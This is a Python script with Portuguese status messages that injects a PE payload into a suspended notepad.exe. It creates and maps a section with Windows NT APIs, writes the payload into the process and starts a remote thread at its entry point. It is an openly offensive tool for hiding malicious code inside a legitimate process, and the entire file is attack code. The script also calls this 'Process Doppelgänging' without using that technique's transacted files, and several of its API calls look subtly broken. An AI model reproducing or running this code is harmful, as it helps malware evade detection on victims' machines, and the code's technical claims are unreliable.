import ctypes
import os
from ctypes import wintypes, byref, c_void_p, c_size_t, c_ulong
import struct

kernel32 = ctypes.WinDLL("kernel32", use_last_error=True)
ntdll = ctypes.WinDLL("ntdll", use_last_error=True)

CREATE_SUSPENDED = 0x00000004
PAGE_EXECUTE_READWRITE = 0x40
MEM_COMMIT = 0x1000
MEM_RESERVE = 0x2000
IMAGE_DOS_SIGNATURE = 0x5A4D

class STARTUPINFO(ctypes.Structure):
    _fields_ = [("cb", wintypes.DWORD),
                ("lpReserved", wintypes.LPWSTR),
                ("lpDesktop", wintypes.LPWSTR),
                ("lpTitle", wintypes.LPWSTR),
                ("dwX", wintypes.DWORD),
                ("dwY", wintypes.DWORD),
                ("dwXSize", wintypes.DWORD),
                ("dwYSize", wintypes.DWORD),
                ("dwXCountChars", wintypes.DWORD),
                ("dwYCountChars", wintypes.DWORD),
                ("dwFillAttribute", wintypes.DWORD),
                ("dwFlags", wintypes.DWORD),
                ("wShowWindow", wintypes.WORD),
                ("cbReserved2", wintypes.WORD),
                ("lpReserved2", ctypes.POINTER(ctypes.c_byte)),
                ("hStdInput", wintypes.HANDLE),
                ("hStdOutput", wintypes.HANDLE),
                ("hStdError", wintypes.HANDLE)]

class PROCESS_INFORMATION(ctypes.Structure):
    _fields_ = [("hProcess", wintypes.HANDLE),
                ("hThread", wintypes.HANDLE),
                ("dwProcessId", wintypes.DWORD),
                ("dwThreadId", wintypes.DWORD)]

NtCreateSection = ntdll.NtCreateSection
NtMapViewOfSection = ntdll.NtMapViewOfSection
NtCreateThreadEx = ntdll.NtCreateThreadEx

HANDLE = wintypes.HANDLE
PVOID = c_void_p
SIZE_T = ctypes.c_size_t
ULONG = wintypes.DWORD

SECTION_ALL_ACCESS = 0xF001F
PAGE_EXECUTE_READ = 0x20
SEC_IMAGE = 0x1000000

START_ADDRESS = None


def read_payload(path):
    with open(path, "rb") as f:
        return f.read()


def get_entrypoint(payload_data):
    dos_header = struct.unpack_from("<H", payload_data, 0)[0]
    if dos_header != IMAGE_DOS_SIGNATURE:
        raise ValueError("PE inválido: MZ header não encontrado")

    e_lfanew = struct.unpack_from("<I", payload_data, 0x3C)[0]
    entry_rva = struct.unpack_from("<I", payload_data, e_lfanew + 0x28)[0]
    return entry_rva


def process_doppelganging(payload_path):
    print("[+] Lendo payload...")
    payload = read_payload(payload_path)
    entry_rva = get_entrypoint(payload)
    print(f"[+] EntryPoint RVA: 0x{entry_rva:X}")

    # 1. Cria processo suspenso
    si = STARTUPINFO()
    si.cb = ctypes.sizeof(si)
    pi = PROCESS_INFORMATION()

    target = "C:\\Windows\\System32\\notepad.exe"

    res = kernel32.CreateProcessW(
        target,
        None,
        None,
        None,
        False,
        CREATE_SUSPENDED,
        None,
        None,
        byref(si),
        byref(pi)
    )

    if not res:
        raise ctypes.WinError(ctypes.get_last_error())
    print(f"[+] Processo suspenso criado: PID {pi.dwProcessId}")

    # 2. Cria section com payload
    section = HANDLE()
    max_size = c_size_t(len(payload))
    status = NtCreateSection(
        byref(section),
        SECTION_ALL_ACCESS,
        None,
        byref(max_size),
        PAGE_EXECUTE_READ,
        SEC_IMAGE,
        None
    )
    if status != 0:
        raise ctypes.WinError(ctypes.get_last_error())
    print("[+] Section criada")

    # 3. Mapeia a section no processo remoto
    base_address = PVOID()
    view_size = c_size_t(0)
    status = NtMapViewOfSection(
        section,
        pi.hProcess,
        byref(base_address),
        0,
        0,
        None,
        byref(view_size),
        1,
        0,
        PAGE_EXECUTE_READ
    )
    if status != 0:
        raise ctypes.WinError(ctypes.get_last_error())
    print(f"[+] Payload mapeado no alvo em: {hex(base_address.value)}")

    # 4. Escreve payload na seção mapeada (caso necessário)
    written = ctypes.c_size_t(0)
    kernel32.WriteProcessMemory(
        pi.hProcess,
        base_address,
        payload,
        len(payload),
        byref(written)
    )

    # 5. Cria thread para executar o payload
    remote_entry = base_address.value + entry_rva
    thread_handle = HANDLE()

    status = NtCreateThreadEx(
        byref(thread_handle),
        0x1FFFFF,
        None,
        pi.hProcess,
        c_void_p(remote_entry),
        None,
        False,
        0,
        0,
        0,
        None
    )
    if status != 0:
        raise ctypes.WinError(ctypes.get_last_error())
    print(f"[+] Thread remota criada no entrypoint: 0x{remote_entry:X}")

    print("[✓] Payload executado via Process Doppelgänging avançado")


if __name__ == "__main__":
    process_doppelganging("C:\\Temp\\payload.exe")